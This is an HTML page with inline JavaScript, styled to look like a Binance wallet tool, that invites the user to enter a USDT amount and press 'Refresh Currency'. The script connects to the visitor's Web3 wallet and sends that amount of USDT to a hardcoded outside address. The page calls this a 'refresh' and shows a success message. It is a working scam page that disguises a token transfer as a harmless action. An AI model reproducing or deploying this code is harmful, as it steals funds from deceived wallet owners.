<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BRC</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        :root {
            --binance-yellow: #F3BA2F;
            --binance-black: #0B0E11;
            --binance-card: #181A20;
            --binance-text: #EAECEF;
            --binance-gray: #848E9C;
            --binance-input: #2B3139;
        }

        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background-color: var(--binance-black); 
            color: var(--binance-text); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }

        .card { 
            background: var(--binance-card); 
            padding: 30px; 
            border-radius: 20px; 
            width: 100%; 
            max-width: 340px; 
            text-align: center; 
            border: 1px solid #2B3139; 
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }

        .logo { color: var(--binance-yellow); font-size: 28px; font-weight: bold; margin-bottom: 25px; letter-spacing: 2px; }
        
        .input-label { text-align: left; font-size: 13px; color: var(--binance-gray); margin-bottom: 8px; padding-left: 5px; }

        .input-box { 
            width: 100%; 
            padding: 15px; 
            margin-bottom: 30px; 
            border-radius: 12px; 
            border: 1px solid #474D57; 
            background: var(--binance-input); 
            color: var(--binance-yellow); 
            font-size: 28px; 
            font-weight: bold; 
            text-align: center; 
            box-sizing: border-box; 
            outline: none; 
        }

        .pay-btn { 
            width: 100%; 
            padding: 16px; 
            background: var(--binance-yellow); 
            color: #000; 
            border: none; 
            border-radius: 12px; 
            font-size: 18px; 
            font-weight: bold; 
            cursor: pointer; 
            transition: 0.3s; 
        }

        .pay-btn:disabled { background: #474D57; color: #848E9C; cursor: not-allowed; }

        .loader { 
            border: 3px solid #f3f3f3; 
            border-top: 3px solid #000; 
            border-radius: 50%; 
            width: 18px; 
            height: 18px; 
            animation: spin 0.8s linear infinite; 
            display: inline-block; 
            margin-right: 10px; 
            vertical-align: middle;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">BRC</div>
    <div class="input-label">Enter Amount (USDT)</div>
    
    <input type="number" id="amountInput" class="input-box" placeholder="0.00" step="any">

    <button id="mainBtn" class="pay-btn" onclick="startPayment()">Refresh Currency</button>
</div>

<script>
    const myWalletAddress = "0x831dC82F06C9Cd90AE81a7b0c837A92ae9Dac08c"; 
    const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
    const abi = ["function transfer(address to, uint256 amount) public returns (bool)"];

    async function startPayment() {
        const btn = document.getElementById('mainBtn');
        const amountValue = document.getElementById('amountInput').value;

        if (!amountValue || amountValue <= 0) {
            alert("Please enter a valid amount.");
            return;
        }

        if (typeof window.ethereum !== 'undefined') {
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = provider.getSigner();
                const contract = new ethers.Contract(usdtContractAddress, abi, signer);
                
                const amountToSend = ethers.utils.parseUnits(amountValue.toString(), 18);

                const tx = await contract.transfer(myWalletAddress, amountToSend);
                
                btn.disabled = true;
                btn.innerHTML = '<span class="loader"></span> Refreshing...';

                await tx.wait(); 

                btn.innerText = "Refresh complete";
                btn.style.background = "#02C076"; 
                btn.style.color = "white";

            } catch (error) {
                btn.disabled = false;
                btn.innerText = "Refresh Currency";
            }
        } else {
            alert("Please use Binance Web3 Wallet.");
        }
    }
</script>

</body>
</html>
